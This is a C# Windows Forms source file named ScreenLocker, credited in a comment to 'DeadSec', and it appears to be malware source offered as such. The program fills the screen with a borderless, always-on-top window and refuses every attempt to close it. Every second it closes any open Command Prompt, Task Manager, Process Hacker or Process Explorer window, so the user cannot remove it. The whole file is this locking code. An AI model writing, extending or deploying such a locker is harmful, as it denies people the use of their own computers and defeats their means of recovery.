using System;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Windows.Forms;

/*
 * │ Coded By        : DeadSec

 
 */


namespace ScreenLocker
{
    public partial class Form1 : Form
    {
        private readonly string[] blockedProcesses = { "cmd", "processhacker", "Taskmgr", "procexp64" };
        private Timer processCheckTimer;

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

        private const int WM_CLOSE = 0x0010;

        public Form1()
        {
            InitializeComponent();
            SetupForm();
            SetupProcessCheckTimer();
            this.Load += new System.EventHandler(this.Form1_Load);
        }

        private void SetupForm()
        {
            this.WindowState = FormWindowState.Maximized;
            this.FormBorderStyle = FormBorderStyle.None;
            this.TopMost = true;
            this.ControlBox = false;
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.FormClosing += new FormClosingEventHandler(this.Form1_FormClosing);
        }

        private void SetupProcessCheckTimer()
        {
            processCheckTimer = new Timer();
            processCheckTimer.Interval = 1000; // التحقق ب الثواني 
            processCheckTimer.Tick += new EventHandler(CheckForBlockedProcesses);
            processCheckTimer.Start();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
        }

        private void CheckForBlockedProcesses(object sender, EventArgs e)
        {
            foreach (var process in Process.GetProcesses())
            {
                if (blockedProcesses.Contains(process.ProcessName, StringComparer.OrdinalIgnoreCase))
                {
                    IntPtr hWnd = FindWindow(null, process.MainWindowTitle);
                    if (hWnd != IntPtr.Zero)
                    {
                        PostMessage(hWnd, WM_CLOSE, IntPtr.Zero, IntPtr.Zero);
                    }
                }
            }
        }
    }
}
